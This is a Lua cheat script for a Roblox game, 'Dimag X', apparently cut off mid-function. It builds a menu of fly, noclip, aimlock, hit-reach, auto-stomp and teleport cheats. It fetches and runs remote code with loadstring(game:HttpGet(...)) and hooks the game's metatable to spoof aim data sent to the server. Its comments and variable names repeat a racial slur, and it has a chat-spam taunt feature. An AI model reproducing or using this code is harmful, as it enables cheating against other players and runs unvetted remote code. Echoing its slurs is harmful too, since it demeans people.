local UILibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/twink"))()

local MainUI = UILibrary.Load("Dimag X")
local MainPage = MainUI.AddPage("Main")
local CombatPage = MainUI.AddPage("Combat")
local teleportPage = MainUI.AddPage("Teleports")
local AimlockPage = MainUI.AddPage("Aimlock")
local FunstuffPage = MainUI.AddPage("Fun Stuff")
local AutoBuyPage = MainUI.AddPage("Auto Buy")
local TargetPage = MainUI.AddPage("Target")
local GodPage = MainUI.AddPage("God Stuff")
local autofarm = MainUI.AddPage("Autofarms")
local AnimationsPage = MainUI.AddPage("Animations")
local CreditsPage = MainUI.AddPage("Credits")
-- // Notifs

game.StarterGui:SetCore("SendNotification", {Title = "Dimag X", Text = "Dimag X was founded by Dimag16 in 2022", Icon = "rbxassetid://505845268", Duration = 10, Button1 = "Alright We Winning!"})
game.StarterGui:SetCore("SendNotification", {Title = "Dimag X", Text = "Made by dylann#0009 and jokerr#9999", Icon = "rbxassetid://505845268", Duration = 9, Button1 = "Alright They Are Pro!"})

-- // TOGGLE! (DONT FUCK UP MY FUCKING TOGGLE NIGGER)

local Mouse = game.Players.LocalPlayer:GetMouse()
local Closed = true
Mouse.KeyDown:connect(function(key)
 
if key == "v" then
if Closed == true then
    Closed = false
        game.CoreGui["Dimag X"].Enabled = false
    else
        Closed = true
            game.CoreGui["Dimag X"].Enabled = true
        end
    end
end)

local MainButton = MainPage.AddButton("Fly (X)", function()
    local plr = game.Players.LocalPlayer
    local mouse = plr:GetMouse()

    localplayer = plr

    if workspace:FindFirstChild("Core") then
        workspace.Core:Destroy()
    end

    local Core = Instance.new("Part")
    Core.Name = "Core"
    Core.Size = Vector3.new(0.05, 0.05, 0.05)

    spawn(function()
        Core.Parent = workspace
        local Weld = Instance.new("Weld", Core)
        Weld.Part0 = Core
        Weld.Part1 = localplayer.Character.LowerTorso
        Weld.C0 = CFrame.new(0, 0, 0)
    end)

    workspace:WaitForChild("Core")

    local torso = workspace.Core
    flying = true
    local speed=7.5
    local keys={a=false,d=false,w=false,s=false}
    local e1
    local e2
    local function start()
        local pos = Instance.new("BodyPosition",torso)
        local gyro = Instance.new("BodyGyro",torso)
        pos.Name="EPIXPOS"
        pos.maxForce = Vector3.new(math.huge, math.huge, math.huge)
        pos.position = torso.Position
        gyro.maxTorque = Vector3.new(9e9, 9e9, 9e9)
        gyro.cframe = torso.CFrame
        repeat
            wait()
            localplayer.Character.Humanoid.PlatformStand=true
            local new=gyro.cframe - gyro.cframe.p + pos.position
            if not keys.w and not keys.s and not keys.a and not keys.d then
                speed=7.5
            end
            if keys.w then
                new = new + workspace.CurrentCamera.CoordinateFrame.lookVector * speed
                speed=speed+0
            end
            if keys.s then
                new = new - workspace.CurrentCamera.CoordinateFrame.lookVector * speed
                speed=speed+0
            end
            if keys.d then
                new = new * CFrame.new(speed,0,0)
                speed=speed+0
            end
            if keys.a then
                new = new * CFrame.new(-speed,0,0)
                speed=speed+0
            end
            if speed>3.2 then
                speed=7.5
            end
            pos.position=new.p
            if keys.w then
                gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(-math.rad(speed*0),0,0)
            elseif keys.s then
                gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(math.rad(speed*0),0,0)
            else
                gyro.cframe = workspace.CurrentCamera.CoordinateFrame
            end
        until flying == false
        if gyro then gyro:Destroy() end
        if pos then pos:Destroy() end
        flying=false
        localplayer.Character.Humanoid.PlatformStand=false
        speed=7.5
    end
    e1=mouse.KeyDown:connect(function(key)
        if not torso or not torso.Parent then flying=false e1:disconnect() e2:disconnect() return end
        if key=="w" then
            keys.w=true
        elseif key=="s" then
            keys.s=true
        elseif key=="a" then
            keys.a=true
        elseif key=="d" then
            keys.d=true
        elseif key=="x" then
            if flying==true then
                flying=false
            else
                flying=true
                start()
            end
        end
    end)
    e2=mouse.KeyUp:connect(function(key)
        if key=="w" then
            keys.w=false
        elseif key=="s" then
            keys.s=false
        elseif key=="a" then
            keys.a=false
        elseif key=="d" then
            keys.d=false
        end
    end)
    start() 		
end)
local MainToggle = MainPage.AddToggle("No Clip", false, function(t)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/LegoHacker1337/legohacks/main/PhysicsServiceOnClient.lua"))()
    setfflag("HumanoidParallelRemoveNoPhysics", "False")
    setfflag("HumanoidParallelRemoveNoPhysicsNoSimulate2", "False")
    if t == true then
        game:GetService('RunService'):BindToRenderStep("crash", 0 , function()
            game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
        end)
    elseif t == false then
        game:GetService('RunService'):UnbindFromRenderStep("crash")
    end
end)
local MainButton = MainPage.AddButton("Hide User", function()
	if game.Players.LocalPlayer.Character:FindFirstChild("In-gameMask") then
        game.Players.LocalPlayer.Character:FindFirstChild("In-gameMask"):FindFirstChildWhichIsA("Model"):Destroy()
        game.Players.LocalPlayer.Character:FindFirstChild("In-gameMask"):FindFirstChild('Handle'):Destroy()
    end
end)

local xdfporn = MainPage.AddButton("Force Reset", function()
    for i, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
        if v:IsA("BasePart") then
            v:Destroy()
        end
    end
end)
local MainButton = MainPage.AddButton("Korblox", function()
	local ply = game.Players.LocalPlayer
		local chr = ply.Character
		chr.RightLowerLeg.MeshId = "902942093"
		chr.RightLowerLeg.Transparency = "1"
		chr.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
		chr.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
		chr.RightFoot.MeshId = "902942089"
		chr.RightFoot.Transparency = "1"
end)
local MainButton = MainPage.AddButton("Headless", function()
    game.Players.LocalPlayer.Character.Head.Transparency = 1
    game.Players.LocalPlayer.Character.Head.Transparency = 1
    for i,v in pairs(game.Players.LocalPlayer.Character.Head:GetChildren()) do
    if (v:IsA("Decal")) then
    v.Transparency = 1
    end
    end
end)

local unjailbutton = MainPage.AddButton("Unjail", function()
    if game:GetService("Players").LocalPlayer.DataFolder.Currency.Value >= 125 then
        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-270.94, 20.327, -242.38)
        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-270.94, 20.327, -242.38)
        wait()
        fireclickdetector(game:GetService("Workspace").Ignored.Shop["[Key] - $125"].ClickDetector)
        wait(.1)
        fireclickdetector(game:GetService("Workspace").Ignored.Shop["[Key] - $125"].ClickDetector)
        fireclickdetector(game:GetService("Workspace").Ignored.Shop["[Key] - $125"].ClickDetector)
        repeat
            wait()
        until game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("[Key]")
        local Hum = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if Hum.Health > 0 then
            key1 = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("[Key]")
            if key1 then
                Hum:EquipTool(key1)
                for i, v in pairs(game:GetService"Players".LocalPlayer.Character:GetChildren()) do
                    if v:isA("Tool") then
                        game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(key1)
                        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-485.668, 23.631, -285.169)
                        v:Activate()
                    end
                end
            end
        end
    end
end)
local naked = MainPage.AddButton("Anonymous (Removes clothes)", function()
	local function inTable(What, Table)
		for Index, Value in pairs(Table) do
			if What == Value then
				return true
			end
		end
		return false
	end

	local removingClasses = {
		"Accessory",
		"Pants",
		"Shirt",
	}

	for _, Instance in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
		if inTable(Instance.ClassName, removingClasses) or Instance.Name == "face" then
			Instance:Destroy()
		end
	end
end)

local qtotp = MainPage.AddButton("- to TP", function()
    plr = game.Players.LocalPlayer
 
    hum = plr.Character.HumanoidRootPart
     
    mouse = plr:GetMouse()
     
     
     
    mouse.KeyDown:connect(function(key)
     
    if key == "-" then
     
    if mouse.Target then
     
    hum.CFrame = CFrame.new(mouse.Hit.x, mouse.Hit.y + 5, mouse.Hit.z)
     
    end
     
    end
    end)
    end)

local antibag = MainPage.AddButton("Anti-Bag", function()
    local LP = game.Players.LocalPlayer;

    for i,v in ipairs(LP.Character:GetDescendants()) do
        if v.Name == "Christmas_Sock" then v:Destroy()
            end;
        end;
            
        LP.Character.ChildAdded:Connect(function()
        wait(0.3)
        for i,v in ipairs(LP.Character:GetDescendants()) do
        if v.Name == "Christmas_Sock" then v:Destroy()
        end;
        end;
        end);
    
end)

local FirstSlider = MainPage.AddSlider("Walk Speed", {Min = 0, Max = 150, Def = 50}, function(t)
    game.Players.LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid').Name = 'SWAG MODE'
    game.Players.LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid').WalkSpeed = t
    if t == 16 then
        game.Players.LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid').Name = 'Humanoid'
        game.Players.LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid').WalkSpeed = 16
    end
end)
local MainButton = MainPage.AddButton("Trash Talk", function()
    function dowait()
        wait(0.172)
    end
    local tbl_main = 
    {
          "focus up son." , 
          "All"
    }
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl_main))
    dowait()
    local tbl_main = 
    {
          "run my hours." , 
          "All"
    }
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl_main))
    dowait()
    local tbl_main = 
    {
          "your so bad dont duck." , 
          "All"
    }
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl_main))
    dowait()
    local tbl_main = 
    {
          "lol airshotted so bad." , 
          "All"
    }
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl_main))
    dowait()
    local tbl_main = 
    {
          "ur bad kid run officials." , 
          "All"
    }
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl_main))
end)
local MainButton = MainPage.AddButton("No Display Names", function()
    pcall(function()
        for i, v in pairs(game:GetService("Players"):GetPlayers()) do
            if v.Character then
                if v.Character:FindFirstChild("Humanoid") then
                    v.Character:FindFirstChild("Humanoid").DisplayName = v.Name 
                end
            end
        end
    end)
end)
local MainButton = MainPage.AddButton("Ungrab", function()
    local player = game.Players.LocalPlayer
    local GC = game:GetService("Workspace").Players:WaitForChild(player.Name):FindFirstChild("GRABBING_CONSTRAINT")
    if GC then
        GC:Destroy()
        wait(0.04)
        player.character.Humanoid.Sit = true
        wait(0.04)
        game.Players.LocalPlayer.Character.Humanoid:ChangeState(3)
    end
end)
local MainButton = MainPage.AddButton("Rejoin", function()
    game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
end)

---------------
-- Combat Nigger
local FirstButton = CombatPage.AddButton("Inf-Jump", function()
    local player = game.Players.LocalPlayer
    local spacedown = false
    staminup = true
    game:GetService('UserInputService').InputBegan:Connect(function(key,b)
        if key.KeyCode == Enum.KeyCode.Space and not b then
            if staminup == true then
                spacedown = true
                while spacedown == true do
                    wait()
                    player.Character:FindFirstChildWhichIsA('Humanoid').JumpPower = 50
                    player.Character:FindFirstChildWhichIsA('Humanoid').Jump = true
                    player.Character:FindFirstChildWhichIsA('Humanoid').JumpPower = 50
                end
            end
        end
    end)
    game:GetService('UserInputService').InputEnded:Connect(function(key,b)
        if key.KeyCode == Enum.KeyCode.Space and not b then
            if staminup == true then
                spacedown = false
            end
        end
    end)
end)
local FirstToggle = CombatPage.AddToggle("Anti-Slow", false, function(gh)
    if gh == true then
        game:GetService('RunService'):BindToRenderStep("Anti-Slow", 0 , function()
            if game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoWalkSpeed") then game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoWalkSpeed"):Destroy() end
            if game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("ReduceWalk") then game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("ReduceWalk"):Destroy() end
            if game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoJumping") then game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoJumping"):Destroy() end
            if game.Players.LocalPlayer.Character.BodyEffects.Reload.Value == true then game.Players.LocalPlayer.Character.BodyEffects.Reload.Value = false end
        end)
    elseif gh == false then
        game:GetService('RunService'):UnbindFromRenderStep("Anti-Slow")
    end
end)

local FirstToggle = CombatPage.AddToggle("Fist Reach!", false, function(e)
    if e == true then
        game:GetService('RunService'):BindToRenderStep("Reach", 0 , function()
            local success, err = pcall(function()
                if game.Players.LocalPlayer.Character.BodyEffects.Attacking.Value == true then
                    for i,v in pairs(game:GetService('Players'):GetChildren()) do
                        if (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.LeftHand.Position).Magnitude <= 50 then
                            if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") then
                                if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild('Handle') then
                                    firetouchinterest(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle, v.Character.UpperTorso, 0)
                                else
                                    firetouchinterest(game.Players.LocalPlayer.Character['RightHand'], v.Character.UpperTorso, 0)
                                    firetouchinterest(game.Players.LocalPlayer.Character['LeftHand'], v.Character.UpperTorso, 0)
                                    firetouchinterest(game.Players.LocalPlayer.Character['RightFoot'], v.Character.UpperTorso, 0)
                                    firetouchinterest(game.Players.LocalPlayer.Character['LeftFoot'], v.Character.UpperTorso, 0)
                                    firetouchinterest(game.Players.LocalPlayer.Character['RightLowerLeg'], v.Character.UpperTorso, 0)
                                    firetouchinterest(game.Players.LocalPlayer.Character['LeftLowerLeg'], v.Character.UpperTorso, 0)
                                end
                            end
                        end
                    end
                end
            end)
        end)
    elseif e == false then
        game:GetService('RunService'):UnbindFromRenderStep("Reach")
    end
end)

local FirstToggle = CombatPage.AddButton("Tool Reach!", function()
    for i, v in pairs(game:GetService"Players".LocalPlayer.Character:GetChildren()) do
        if v:isA("Tool") then
            local a = Instance.new("SelectionBox", v.Handle)
            a.Adornee = v.Handle
            v.Handle.Size = Vector3.new(50, 50, 50)
            v.Handle.Transparency = 1
            v.GripPos = Vector3.new(0, 0, 0)
        end
    end
end)
    
local FirstToggle = CombatPage.AddToggle("Auto-Stomp", false, function(r)
    if r == true then
        game:GetService('RunService'):BindToRenderStep("Auto-Stomp", 0 , function()
            game:GetService("ReplicatedStorage").MainEvent:FireServer("Stomp")
        end)
    elseif r == false then
        game:GetService('RunService'):UnbindFromRenderStep("Auto-Stomp")
    end
end)
local FirstToggle = CombatPage.AddToggle("Anti-Stomp", false, function(x)
    if x == true then
        game:GetService('RunService'):BindToRenderStep("Anti-Stomp", 0 , function()
            if game.Players.LocalPlayer.Character.Humanoid.Health <= 5 then
                for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                    if v:IsA('MeshPart') or v:IsA('Part') then
                        v:Destroy()
                    end
                end
                for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                    if v:IsA('Accessory') then
                        v.Handle:Destroy()
                    end
                end
            end
        end)
    elseif x == false then
        game:GetService('RunService'):UnbindFromRenderStep("Anti-Stomp")
    end
end)
local FirstToggle = CombatPage.AddToggle("Auto-Reload", false, function(r)
    if r == true then
        game:GetService('RunService'):BindToRenderStep("Auto-Reload", 0 , function()
            if game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool") then
                if game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool"):FindFirstChild("Ammo") then
                    if game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool"):FindFirstChild("Ammo").Value <= 0 then
                        game:GetService("ReplicatedStorage").MainEvent:FireServer("Reload", game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool")) 
                        wait(1)
                    end
                end
            end
        end)
    elseif r == false then
        game:GetService('RunService'):UnbindFromRenderStep("Auto-Reload")
    end
end)
local xdpussy = CombatPage.AddButton("Free Fists [Q]", function()
    -- // Variables
	local localPlayer       = game:GetService("Players").LocalPlayer
	local localCharacter    = localPlayer.Character
	local Mouse             = localPlayer:GetMouse()
	local FistControl       = false
	local LeftFist          = localCharacter.LeftHand
	local RightFist         = localCharacter.RightHand

	-- // Services
	local uis = game:GetService("UserInputService")

	-- // Coroutine Loop + Functions
	local loopFunction = function()
		LeftFist.CFrame  = CFrame.new(Mouse.Hit.p)
		RightFist.CFrame = CFrame.new(Mouse.Hit.p)
	end

	local Loop

	local Start = function()
		Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction)
	end

	local Pause = function()
		Loop:Disconnect()
	end

	-- // Hotkeys
	uis.InputBegan:connect(function(Key)
		if (Key.KeyCode == Enum.KeyCode.Q) then
			if (FistControl == false) then
				FistControl = true
				Start()
				pcall(function()
					localCharacter.RightHand.RightWrist:Remove()
					localCharacter.LeftHand.LeftWrist:Remove()
				end)
			elseif (FistControl == true) then
				FistControl = false
				Pause()
				local rightwrist  = Instance.new("Motor6D")
				rightwrist.Name   = "RightWrist"
				rightwrist.Parent = localCharacter.RightHand
				rightwrist.C0     = CFrame.new(1.18422506e-07, -0.5009287, -6.81715525e-18, 1, 0, 0, 0, 1, 0, 0, 0, 1)
				rightwrist.C1     = CFrame.new(3.55267503e-07, 0.125045404, 5.92112528e-08, 1, 0, 0, 0, 1, 0, 0, 0, 1)
				rightwrist.Part0  = localCharacter.RightLowerArm
				rightwrist.Part1  = localCharacter.RightHand

				local leftwrist   = Instance.new("Motor6D")
				leftwrist.Name    = "LeftWrist"
				leftwrist.Parent  = localCharacter.LeftHand
				leftwrist.C0      = CFrame.new(0.000475466368, -0.5009287, 7.59417072e-20, 1, 0, 0, 0, 1, 0, 0, 0, 1)
				leftwrist.C1      = CFrame.new(0.000475821638, 0.125045404, 5.92112528e-08, 1, 0, 0, 0, 1, 0, 0, 0, 1)
				leftwrist.Part0   = localCharacter.LeftLowerArm
				leftwrist.Part1   = localCharacter.LeftHand
			end
		end
	end)
end)
local FirstButton = CombatPage.AddButton("No Recoil", function()
    local player = game.Players.LocalPlayer
    for i,v in pairs(game:GetService('Workspace'):GetChildren()) do
        if v:IsA('Camera') then
            v:Destroy()
        end
    end
    local newcam = Instance.new('Camera')
    newcam.Parent = game:GetService('Workspace')
    newcam.Name = 'Camera'
    newcam.CameraType = 'Custom'
    newcam.CameraSubject = player.Character:FindFirstChildWhichIsA('Humanoid')
    newcam.HeadLocked = true
    newcam.HeadScale = 1 
end)

---------------
-- Teleports
local SecondButton = teleportPage.AddButton("Admin Base", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-797.15, -39.6189, -887.957)
end)
local SecondButton = teleportPage.AddButton("Food Shop [Bank]", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-335.141, 23.7129, -298.029)
end)
local SecondButton = teleportPage.AddButton("Food Shop [Uphill]", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(298.477, 49.3129, -615.231)
end)
local SecondButton = teleportPage.AddButton("Food Shop [Taco]", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(583.96, 51.0917, -479.596)
end)
local SecondButton = teleportPage.AddButton("Food Shop [Hamburger]", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-279.501, 22.6801, -803.887)
end)
local SecondButton = teleportPage.AddButton("Gun Shop [Uphill]", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(481.925, 48.1008, -621.23)
end)
local SecondButton = teleportPage.AddButton("Gun Shop [Armor]", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-580.27, 8.34504, -734.832)
end)
local SecondButton = teleportPage.AddButton("Bank", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-438.689, 39.0127, -284.731)
end)
local SecondButton = teleportPage.AddButton("Police Station", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-263.919, 21.8302, -112.858)
end)
local SecondButton = teleportPage.AddButton("Fire Department", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-129.534, 27.842, -113.062)
end)
local SecondButton = teleportPage.AddButton("Church", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(205.53, 21.7803, -80.2361)
end)
local SecondButton = teleportPage.AddButton("Casino", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-904.457, 24.7803, -156.994)
end)

---------------

local SecondButton = AimlockPage.AddButton("Dimag Aimlock (Q)", function()
    _G.KEY = "q"
    _G.PART = "LowerTorso"
    _G.PRED = 0.037
    _G.Frame = Vector3.new(0,0.53,0)
    _G.AIR = -0.5
    _G.SHIT = 0.1
    
    
    local CC = game:GetService "Workspace".CurrentCamera
    local Plr
    local enabled = false
    local accomidationfactor = nil
    local mouse = game.Players.LocalPlayer:GetMouse()
    local placemarker = Instance.new("Part", game.Workspace)
    local guimain = Instance.new("Folder", game.CoreGui)
    
    getgenv().makemarker = function(Parent, Adornee, Color, Size, Size2)
        local e = Instance.new("BillboardGui", Parent)
        e.Name = "PP"
        e.Adornee = Adornee
        e.Size = UDim2.new(Size, Size2, Size, Size2)
        e.AlwaysOnTop = true
        local a = Instance.new("Frame", e)
        a.Size = UDim2.new(4, 0, 4, 0)
        a.BackgroundTransparency = 0.1
        a.BackgroundColor3 = Color
        local g = Instance.new("UICorner", a)
        g.CornerRadius = UDim.new(50, 50)
        return (e)
    end
    
    local data = game.Players:GetPlayers()
    function noob(player)
        local character
        repeat
            wait()
        until player.Character
        local handler = makemarker(guimain, player.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 255, 255), 0.0, 0)
        handler.Name = player.Name
        player.CharacterAdded:connect(
            function(Char)
                handler.Adornee = Char:WaitForChild(_G.PART)
            end
        )
    
        local TextLabel = Instance.new("TextLabel", handler)
        TextLabel.BackgroundTransparency = 1
        TextLabel.Position = UDim2.new(0, 0, 0, -50)
        TextLabel.Size = UDim2.new(0, 100, 0, 100)
        TextLabel.Font = Enum.Font.SourceSansSemibold
        TextLabel.TextSize = 14
        TextLabel.TextColor3 = Color3.new(1, 1, 1)
        TextLabel.TextStrokeTransparency = 0
        TextLabel.TextYAlignment = Enum.TextYAlignment.Bottom
        TextLabel.Text = "Name: " .. player.Name
        TextLabel.ZIndex = 10
    
        spawn(
            function()
                while wait() do
                    if player.Character then
                    --TextLabel.Text = player.Name.." | Bounty: "..tostring(player:WaitForChild("leaderstats").Wanted.Value).." | "..tostring(math.floor(player.Character:WaitForChild("Humanoid").Health))
                    end
                end
            end
        )
    end
    
    for i = 1, #data do
        if data[i] ~= game.Players.LocalPlayer then
            noob(data[i])
        end
    end
    
    game.Players.PlayerAdded:connect(
        function(Player)
            noob(Player)
        end
    )
    
    game.Players.PlayerRemoving:Connect(
        function(player)
            guimain[player.Name]:Destroy()
        end
    )
    
    spawn(
        function()
            placemarker.Anchored = true
            placemarker.CanCollide = false
            placemarker.Size = Vector3.new(0.1, 0.1, 0.1)
            placemarker.Transparency = _G.SHIT
            makemarker(placemarker, placemarker, Color3.fromRGB(255, 255, 255), 0.20, 0)
        end
    )
    
    mouse.KeyDown:Connect(
        function(k)
            if k ~= _G.KEY then
                return
            end
            if enabled then
                -- guimain[Plr.Name].Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                enabled = false
                TextLabel.TextColor3 = Color3.fromRGB(255, 20, 75)
                TextLabel.Text = "------"
            else
                --guimain[Plr.Name].Frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
                enabled = true
                Plr = getClosestPlayerToCursor()
                TextLabel.TextColor3 = Color3.fromRGB(12, 255, 0)
                TextLabel.Text = Plr.Character.Humanoid.DisplayName
            end
        end)
    
    function getClosestPlayerToCursor()
        local closestPlayer
        local shortestDistance = math.huge
    
        for i, v in pairs(game.Players:GetPlayers()) do
            if
                v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and
                    v.Character.Humanoid.Health ~= 0 and
                    v.Character:FindFirstChild(_G.PART)
             then
                local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
                local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(mouse.X, mouse.Y)).magnitude
                if magnitude < shortestDistance then
                    closestPlayer = v
                    shortestDistance = magnitude
                end
            end
        end
        return closestPlayer
    end
    
    game:GetService "RunService".Stepped:connect(
        function()
            if enabled and Plr.Character and Plr.Character:FindFirstChild(_G.PART) then
                placemarker.CFrame =
                    CFrame.new(Plr.Character[_G.PART].Position + _G.Frame + (Plr.Character[_G.PART].Velocity * accomidationfactor))
            else
                placemarker.CFrame = CFrame.new(0, 9999, 0)
            end
        end
    )
    
    local mt = getrawmetatable(game)
    local old = mt.__namecall
    setreadonly(mt, false)
    mt.__namecall =
        newcclosure(
        function(...)
            local args = {...}
            if enabled and getnamecallmethod() == "FireServer" and args[2] == "UpdateMousePos" then
                args[3] = Plr.Character[_G.PART].Position+ _G.Frame + (Plr.Character[_G.PART].Velocity * accomidationfactor)
                return old(unpack(args))
            end
            return old(...)
        end
    )
    
    game.Players.LocalPlayer.Chatted:Connect(
        function(Chat)
            if Chat == "print" then
                print(accomidationfactor)
            end
        end
    )
    
    game.Players.LocalPlayer.Chatted:Connect(
        function(Chat)
            if Chat == "Code:1029" then
    
                _G.KEY = nil
                _G.AIR = nil
                _G.PART = nil
                _G.PRED = nil
                TextLabel.Visible = false
    
    
            end
        end
    )
    
    game.Players.LocalPlayer.Chatted:Connect(
        function(Chat)
            if Chat == "Code:1030" then
    
            _G.KEY = "q"
            _G.PART = "UpperTorso"
            _G.PRED = 0.037
            _G.Frame = Vector3.new(0,0.0,0)
            _G.AIR = -0.5
            _G.SHIT = 1
    
    
            end
        end
    )
    
    
    
    game.Players.LocalPlayer.Chatted:Connect(
        function(Chat)
            if Chat == "P+" then
    
    
                _G.PRED = _G.PRED+0.001
    
    
    
            end
        end
    )
    
    game.Players.LocalPlayer.Chatted:Connect(
        function(Chat)
            if Chat == "P-" then
    
                _G.PRED = _G.PRED-0.001
    
    
    
            end
        end
    )
    
    
    --[[
    while wait() do
        local ping = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
        local Value = tostring(ping)
        local pingValue = Value:split(" ")
        local PingNumber = pingValue[1]
        
        accomidationfactor = PingNumber / 1000 + _G.PRED
         if getClosestPlayerToCursor().Character.Humanoid.Jump == true and AimlockTarget.Character.Humanoid.FloorMaterial == Enum.Material.Air then
            _G.PART = "RightFood"
            accomidationfactor = _G.AIR
        else
            getClosestPlayerToCursor().Character:WaitForChild("Humanoid").StateChanged:Connect(function(old,new)
                if new == Enum.HumanoidStateType.Freefall then
                    _G.PART = "RightFood"
                    accomidationfactor = _G.AIR
                else
                    _G.PART = "UpperTorso"
                    accomidationfactor = PingNumber / 1000 + _G.PRED
                end
            end)
        end
    end
    
    ]]
    
    while wait() do
        local ping = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
        local Value = tostring(ping)
        local pingValue = Value:split(" ")
        local PingNumber = pingValue[1]
        
     accomidationfactor = PingNumber / 1000 + _G.PRED
    end
end)

-- funtab 
local fucknigger = FunstuffPage.AddButton("FOV [PRO]", function()
    workspace.CurrentCamera.FieldOfView = 120
end)

local niggers = FunstuffPage.AddButton("Mask Names", function()
	for _, v in pairs(game:GetService("Players"):GetPlayers()) do
		if v and v.Character and v.Character:FindFirstChildOfClass("Humanoid") and v.Character:FindFirstChildOfClass("Humanoid").DisplayDistanceType ~= Enum.HumanoidDisplayDistanceType.Viewer then
			v.Character:FindFirstChildOfClass("Humanoid").DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Viewer
		end
	end
end)
local niggerbutton = FunstuffPage.AddButton("PP Bat", function()
    local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
    local k = game.Workspace.Ignored.Shop["[Bat] - $250"]
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = k.Head.CFrame + Vector3.new(0, 3, 0)
    if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - k.Head.Position).Magnitude <= 50 then
        wait(.2)
        fireclickdetector(k:FindFirstChild("ClickDetector"), 4)
        toolf = game.Players.LocalPlayer.Backpack:WaitForChild("[Bat]")
        toolf.Parent = game.Players.LocalPlayer.Character
        wait()
        game.Players.LocalPlayer.Character:WaitForChild("[Bat]")
        game.Players.LocalPlayer.Character:WaitForChild("[Bat]").Grip = CFrame.new(-2.4000001, -0.699999988, 0, 0, 1, -0, -1, 0, -0, 0, 0, 1)
        game.Players.LocalPlayer.Character:WaitForChild("[Bat]").GripForward = Vector3.new(0, -1, -0)
        game.Players.LocalPlayer.Character:WaitForChild("[Bat]").GripPos = Vector3.new(1.2111, 1.11114, 1.8111)
        game.Players.LocalPlayer.Character:WaitForChild("[Bat]").GripUp = Vector3.new(-500000, 404, 5000000)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
    end
end)

local autoclick = FunstuffPage.AddButton("AutoClicker [v]", function()
    local Player = game:GetService("Players").LocalPlayer
    local Mouse = Player:GetMouse()
    local Clicking = false
    Mouse.KeyDown:Connect(function(Key)
        if Key == "v" then
            Clicking = not Clicking
            if Clicking == true then
                repeat
                    mouse1click()
                    wait(0.001)
